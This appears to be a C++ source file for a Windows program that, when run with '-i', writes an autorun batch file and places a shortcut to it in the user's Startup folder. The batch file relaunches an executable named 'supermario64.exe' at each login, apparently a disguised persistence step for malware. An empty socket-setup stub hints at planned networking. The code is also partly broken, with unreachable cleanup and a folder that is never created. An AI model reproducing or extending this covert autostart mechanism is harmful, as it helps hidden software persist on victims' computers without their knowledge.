#include <iostream>
#include <stdlib.h>
#include <Windows.h>
#include <string>
#include <winsock.h>

#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"


bool init_sockets() 
{

}


HRESULT CreateLink(LPCWSTR lpszPathObj, LPCWSTR lpszPathLink, LPCWSTR lpszDesc)
{
    HRESULT hres, coinit;
    IShellLink* psl;

    // Get a pointer to the IShellLink interface. It is assumed that CoInitialize
    // has already been called.
    coinit = CoInitialize(NULL);
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    if (SUCCEEDED(hres))
    {
        IPersistFile* ppf;

        // Set the path to the shortcut target and add the description. 
        psl->SetPath(lpszPathObj);
        psl->SetDescription(lpszDesc);

        // Query IShellLink for the IPersistFile interface, used for saving the 
        // shortcut in persistent storage. 
        hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

        if (SUCCEEDED(hres))
        {
            // Save the link by calling IPersistFile::Save. 
            hres = ppf->Save(lpszPathLink, TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    return hres;
    CoUninitialize();
}

int main(int argc, char* argv[])
{

    if (argc == 2 && !strcmp(argv[1], "-i")) {
        TCHAR username[256];
        TCHAR path[MAX_PATH];
        TCHAR rppath[MAX_PATH];
        TCHAR autorunsh[MAX_PATH];
        DWORD size = 256;
        FILE* fpW;

        int wchars_num = MultiByteToWideChar(CP_UTF8, 0, argv[0], -1, NULL, 0);
        wchar_t* wstr = (wchar_t*)malloc(wchars_num * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, argv[0], -1, wstr, wchars_num);


        GetUserName((TCHAR*)username, &size);

        wsprintfW(path, L"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Maintenance", username);

        wsprintfW(rppath, L"%s\\%s", path, L"supermario64.exe");

        wsprintfW(autorunsh, L"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autorun.bat", username);

        wsprintfW(path, L"%s\\autorun.bat", path);

        _wfopen_s(&fpW, path, L"w");

        fwprintf(fpW, L"@echo off\n%s -i", rppath);

        fclose(fpW);

        CreateLink(path, autorunsh, 0);

        //CopyFileW(wstr, rppath, FALSE);

        std::wcout << wstr;
        //fopen("C:\\")
        free(wstr);
    }
    return 0;
}
